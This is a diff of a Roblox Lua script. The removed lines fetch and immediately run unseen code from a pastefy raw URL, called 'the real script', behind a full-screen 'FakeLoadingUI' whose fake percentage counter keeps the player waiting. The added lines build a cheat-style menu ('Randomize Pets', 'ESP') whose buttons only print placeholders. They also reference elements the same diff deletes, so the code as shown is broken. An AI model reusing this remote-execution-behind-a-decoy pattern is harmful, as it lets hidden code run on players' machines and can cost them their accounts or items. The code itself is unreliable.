@@ -1,109 +1,68 @@
-local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-local TweenService = game:GetService("TweenService")
-local Player = Players.LocalPlayer
+-- Existing setup remains unchanged...
+-- Insert this after the rest of your GUI is created (after `bottomLabel`), or near the end of your script.
 
-repeat task.wait() until Player:FindFirstChild("PlayerGui")
+-- Side UI Box
+local sideUI = Instance.new("Frame")
+sideUI.Size = UDim2.new(0.25, 0, 0.5, 0)
+sideUI.Position = UDim2.new(0.02, 0, 0.25, 0)
+sideUI.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+sideUI.BackgroundTransparency = 0.2
+sideUI.BorderSizePixel = 2
+sideUI.BorderColor3 = Color3.fromRGB(255, 50, 0)
+sideUI.Parent = bg
+sideUI.ZIndex = 2
 
--- Run the real script immediately
-pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
-end)
+-- Title
+local sideTitle = Instance.new("TextLabel")
+sideTitle.Size = UDim2.new(1, 0, 0.15, 0)
+sideTitle.BackgroundTransparency = 1
+sideTitle.Text = "🔥 Options 🔥"
+sideTitle.Font = Enum.Font.GothamBold
+sideTitle.TextScaled = true
+sideTitle.TextColor3 = Color3.fromRGB(255, 80, 0)
+sideTitle.TextStrokeTransparency = 0.7
+sideTitle.Parent = sideUI
 
--- UI Setup
-local gui = Instance.new("ScreenGui")
-gui.Name = "FakeLoadingUI"
-gui.IgnoreGuiInset = true
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-gui.DisplayOrder = 9999
-gui.Parent = Player:WaitForChild("PlayerGui")
-
--- Background
-local bg = Instance.new("Frame")
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.Position = UDim2.new(0, 0, 0, 0)
-bg.BackgroundColor3 = Color3.new(0, 0, 0)
-bg.BorderSizePixel = 0
-bg.Parent = gui
-
--- Top Label (smaller, fire-like color)
-local topLabel = Instance.new("TextLabel")
-topLabel.Size = UDim2.new(1, 0, 0.1, 0)
-topLabel.Position = UDim2.new(0, 0, 0.02, 0)
-topLabel.BackgroundTransparency = 1
-topLabel.Text = "Wait Until It Loads"
-topLabel.Font = Enum.Font.GothamBold
-topLabel.TextColor3 = Color3.fromRGB(255, 120, 0) -- Fire orange
-topLabel.TextScaled = true
-topLabel.TextStrokeTransparency = 0.8
-topLabel.TextStrokeColor3 = Color3.fromRGB(255, 70, 0)
-topLabel.Parent = bg
-
--- Loading Percent
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(1, 0, 0.7, 0)
-loadingText.Position = UDim2.new(0, 0, 0.15, 0)
-loadingText.BackgroundTransparency = 1
-loadingText.Text = "0%"
-loadingText.Font = Enum.Font.GothamBlack
-loadingText.TextColor3 = Color3.new(1, 1, 1)
-loadingText.TextScaled = true
-loadingText.TextStrokeTransparency = 0.6
-loadingText.TextStrokeColor3 = Color3.new(0, 0, 0)
-loadingText.Parent = bg
-
--- Bottom Label (smaller, fire-style)
-local bottomLabel = Instance.new("TextLabel")
-bottomLabel.Size = UDim2.new(1, 0, 0.1, 0)
-bottomLabel.Position = UDim2.new(0, 0, 0.88, 0)
-bottomLabel.BackgroundTransparency = 1
-bottomLabel.Text = "Be Patient"
-bottomLabel.Font = Enum.Font.GothamBold
-bottomLabel.TextColor3 = Color3.fromRGB(255, 80, 0)
-bottomLabel.TextScaled = true
-bottomLabel.TextStrokeTransparency = 0.8
-bottomLabel.TextStrokeColor3 = Color3.fromRGB(255, 50, 0)
-bottomLabel.Parent = bg
-
--- Fire Emoji Animation
-local function spawnFire()
-	for i = 1, 5 do
-		local fire = Instance.new("TextLabel")
-		fire.Text = "🔥"
-		fire.Font = Enum.Font.SourceSansBold
-		fire.TextScaled = true
-		fire.TextColor3 = Color3.fromRGB(255, 100, 0)
-		fire.BackgroundTransparency = 1
-		fire.Size = UDim2.new(0.05, 0, 0.05, 0)
-		fire.Position = UDim2.new(math.random(), 0, math.random(), 0)
-		fire.Parent = bg
-
-		local goal = {
-			Position = UDim2.new(math.random(), 0, math.random(), 0),
-			TextTransparency = 1
-		}
-		local tween = TweenService:Create(fire, TweenInfo.new(5, Enum.EasingStyle.Linear), goal)
-		tween:Play()
-
-		task.delay(5, function()
-			fire:Destroy()
-		end)
-	end
+-- Helper function for buttons
+local function createButton(text, emoji, posY)
+	local button = Instance.new("TextButton")
+	button.Size = UDim2.new(0.9, 0, 0.15, 0)
+	button.Position = UDim2.new(0.05, 0, posY, 0)
+	button.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+	button.TextColor3 = Color3.new(1, 1, 1)
+	button.TextScaled = true
+	button.TextStrokeTransparency = 0.7
+	button.TextStrokeColor3 = Color3.fromRGB(255, 80, 0)
+	button.Font = Enum.Font.GothamBold
+	button.Text = emoji .. " " .. text
+	button.Parent = sideUI
+	return button
 end
 
--- Keep spawning fire
-task.spawn(function()
-	while true do
-		spawnFire()
-		task.wait(1)
-	end
+-- Buttons
+local btnEggRandomizer = createButton("Egg Randomizer", "🎲", 0.2)
+local btnPetRandomizer = createButton("Randomize Pets", "🎲", 0.38)
+local btnESP = createButton("ESP: OFF", "👁️", 0.56)
+local btnAutoRandom = createButton("Auto Randomize: OFF", "🔄", 0.74)
+
+-- Functionality Toggles
+local espOn = false
+local autoOn = false
+
+btnESP.MouseButton1Click:Connect(function()
+	espOn = not espOn
+	btnESP.Text = "👁️ ESP: " .. (espOn and "ON" or "OFF")
 end)
 
--- Slower, smoother loading from 0% to 100%
-task.spawn(function()
-	for i = 1, 100 do
-		loadingText.Text = i .. "%"
-		task.wait(math.random(10, 20) / 100) -- takes ~10-15 seconds total
-	end
+btnAutoRandom.MouseButton1Click:Connect(function()
+	autoOn = not autoOn
+	btnAutoRandom.Text = "🔄 Auto Randomize: " .. (autoOn and "ON" or "OFF")
+end)
+
+btnEggRandomizer.MouseButton1Click:Connect(function()
+	print("Egg Randomizer Clicked!") -- Replace with your actual function
+end)
+
+btnPetRandomizer.MouseButton1Click:Connect(function()
+	print("Randomize Pets Clicked!") -- Replace with your actual function
 end)
